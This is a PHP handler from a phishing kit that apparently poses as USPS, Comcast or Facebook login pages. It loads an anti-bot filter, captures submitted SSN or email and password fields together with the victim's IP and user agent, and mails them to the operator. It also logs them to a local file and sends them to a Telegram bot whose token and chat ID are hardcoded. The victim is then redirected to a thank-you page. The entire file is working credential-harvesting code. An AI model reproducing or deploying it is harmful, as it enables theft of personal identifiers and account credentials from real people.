<?php
	error_reporting(0);
	ob_start();
	session_start();

include'antibots.php';
	include 'email.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
	$_SESSION['ssn'] 	= $_POST['ssn'];
	$_SESSION['newZipCode'] 	= $_POST['newZipCode'];
$message = "
       📧USPS_1 : 
📧email : ".$_SESSION['ssn']."
🔑password : ".$_SESSION['newZipCode']."
🌐IP: "._ip()."
🌐User Agent: ".$_SERVER["HTTP_USER_AGENT"]."
";
$Subject="  comcast FB mailacess|"._ip();
$head="From:<no-reply@Loginfb.com>";
mail($my_mail,$Subject,$message,$head);
$fil = fopen('../said.txt', 'a+');
fwrite($fil, '####################'.$message.'####################');
$METRI_TOKEN = "5006771709:AAGbRgvQDzMLooMjcKZQ9HCLLlM0A0aD7sA";
$chat_id = "2051870235";
$tokenlink = "https://api.telegram.org/bot" . $METRI_TOKEN;
$params=[
'chat_id'=>$chat_id,
'text'=>$message,
];
$ch = curl_init($tokenlink . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);
header('location: thanks.php');

}
else
{
	header('location: thanks.php');
} 
